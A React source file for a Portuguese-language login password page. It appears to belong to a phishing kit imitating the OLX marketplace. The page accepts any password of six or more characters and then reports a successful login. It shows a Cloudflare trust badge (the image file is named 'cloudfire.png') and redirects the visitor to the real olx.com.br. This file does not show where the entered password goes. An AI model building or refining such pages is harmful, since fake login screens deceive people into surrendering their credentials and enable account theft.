import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import Logo from "@/components/Logo";
import { Eye, EyeOff, CheckCircle2 } from "lucide-react";
import { toast } from "sonner";
import cloudfire from "../../assets/cloudfire.png";

const Password = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!password) {
      toast.error("Por favor, insira sua senha");
      return;
    }
    
    if (password.length < 6) {
      toast.error("A senha deve ter pelo menos 6 caracteres");
      return;
    }
    
    setShowSuccess(true);
    
    setTimeout(() => {
      toast.success("Login realizado com sucesso!");
      navigate("/");
    }, 1500);
  };

  const handleBack = () => {
    navigate("/auth/verify-phone");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border p-4">
        <Logo />
      </header>
      
      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-8">
          <div className="text-center">
            <h1 className="text-2xl font-semibold text-foreground mb-2">
              Acessar sua conta
            </h1>
            <div className="inline-block bg-secondary px-4 py-1 rounded-full text-sm text-muted-foreground mt-4">
              -
            </div>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="password" className="text-sm font-normal text-foreground">
                Senha
              </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-12 rounded-lg border-input pr-10"
                  placeholder=""
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-accent"
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
            </div>

            {showSuccess && (
              <div className="flex items-center gap-2 text-green-600 text-sm">
                <CheckCircle2 className="w-5 h-5" />
                <span>Sucesso!</span>
              </div>
            )}

            <div className="flex items-center justify-center">
              <img 
                src={cloudfire}
                alt="Cloudflare" 
                className="h-16"
              />
            </div>

            <Button 
             onClick={() => window.location.href = "https://olx.com.br"}
              type="submit"
              className="w-full h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-normal rounded-lg"
            >
              Entrar
            </Button>
          </form>

          <div className="flex justify-between text-sm">
            <button
              onClick={()=>navigate('/auth')}
              className="text-accent hover:underline font-normal"
            >
              Voltar
            </button>
            <button className="text-accent hover:underline font-normal">
              Esqueceu sua senha?
            </button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Password;
